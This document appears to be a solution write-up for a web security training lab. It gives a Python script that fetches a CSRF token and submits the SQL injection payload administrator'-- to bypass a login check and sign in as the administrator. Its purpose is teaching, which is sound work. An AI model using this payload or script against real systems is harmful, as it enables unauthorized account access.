# SQL injection vulnerability allowing login bypass
>This lab contains a SQL injection vulnerability in the login function.
To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.

```python
import requests
import sys
from bs4 import BeautifulSoup

# --- CONFIGURATION ---
# The URL changes every time you restart the lab, so keep this variable easy to access.
BASE_URL = "https://0af100780318282d8381479300a900ec.web-security-academy.net"
LOGIN_PATH = "/login"
TARGET_URL = BASE_URL + LOGIN_PATH

# --- SETUP SESSION ---
# We use a Session object to persist cookies (like the session ID) across requests.
s = requests.Session()

def get_csrf_token(url):
    """Fetches the login page and extracts the CSRF token."""
    
    print(f"[*] Fetching CSRF token from {url}...")
    response = s.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Locate the input tag with name="csrf"
    token_input = soup.find("input", {"name": "csrf"})
    
    if token_input:
        token = token_input['value']
        print(f"[*] Token found: {token}")
        return token
    else:
        print("[-] Error: CSRF token not found via BeautifulSoup.")
        sys.exit(1)

# --- MAIN EXPLOIT LOGIC ---

# Step 1: Get the necessary token
csrf_token = get_csrf_token(TARGET_URL)

# Step 2: Define the payload
# We inject into the username to comment out the password check.
# Payload: administrator'--
login_data = {
    "username": "administrator'--",
    "password": "xyz",  # This is ignored by the database
    "csrf": csrf_token
}

# Step 3: Execute the attack
print(f"[*] Attempting login as administrator...")
# Note: We use s.post to ensure the cookies from Step 1 are sent too.
response = s.post(TARGET_URL, data=login_data)

# Step 4: Verify Success
if "Log out" in response.text:
    print("(+) SUCCESS: Login successful! We are administrator.")
else:
    print("(-) FAILURE: 'Log out' not found in response.")
```